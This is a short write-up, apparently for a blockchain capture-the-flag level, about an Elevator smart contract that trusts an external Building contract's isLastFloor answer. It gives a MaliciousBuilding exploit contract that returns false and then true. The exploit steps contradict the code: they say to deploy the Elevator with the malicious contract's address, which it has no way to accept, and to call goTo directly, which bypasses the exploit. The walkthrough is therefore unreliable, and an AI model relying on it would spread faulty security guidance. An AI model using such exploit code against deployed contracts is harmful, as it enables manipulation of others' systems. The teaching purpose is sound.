# Understanding Trust Issues in Smart Contracts: A Case of Elevator Vulnerability

In the realm of blockchain development, there's a fundamental principle: "Never trust functions that can change the state of a variable or return different outputs during different executions." This principle is essential for ensuring the security and integrity of smart contracts.

## The Vulnerable Contract

Consider the following Solidity contract:

    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface Building {
      function isLastFloor(uint) external returns (bool);
    }
    
    contract Elevator {
      bool public top;
      uint public floor;
    
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
    
        if (! building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }

This contract represents an elevator system where the goTo function allows users to move to different floors. The contract interacts with an external contract (Building) through the isLastFloor function to determine if the current floor is the top floor.

## Exploiting the Vulnerability
The vulnerability lies in the reliance on an external contract to determine whether the current floor is the top floor. An attacker can exploit this vulnerability by implementing a malicious contract that manipulates the behavior of the isLastFloor function.

Here's an example of an exploit contract:

    ```solidity
    contract MaliciousBuilding is Building {
    bool private isFirstIteration = true;

    function isLastFloor(uint) external override returns (bool) {
        if (isFirstIteration) {
            isFirstIteration = false;
            return false;
        } else {
            return true;
        }
      }
    }
    
## Exploit Execution
To execute the exploit and pass this level, follow these steps:

## Deploy the MaliciousBuilding contract.
Deploy the Elevator contract, passing the address of the MaliciousBuilding contract as the Building interface.
Call the goTo function of the Elevator contract with any floor number.
During the first iteration, the isLastFloor function will return false, causing the top variable to remain false. However, during the second iteration, the function will return true, tricking the Elevator contract into believing it has reached the top floor, thus exploiting the vulnerability.

## Conclusion
This case highlights the importance of robust contract design and the need for cautiousness when interacting with external contracts. By adhering to best practices and thoroughly auditing smart contracts, developers can mitigate the risk of vulnerabilities and safeguard decentralized systems against potential exploits.
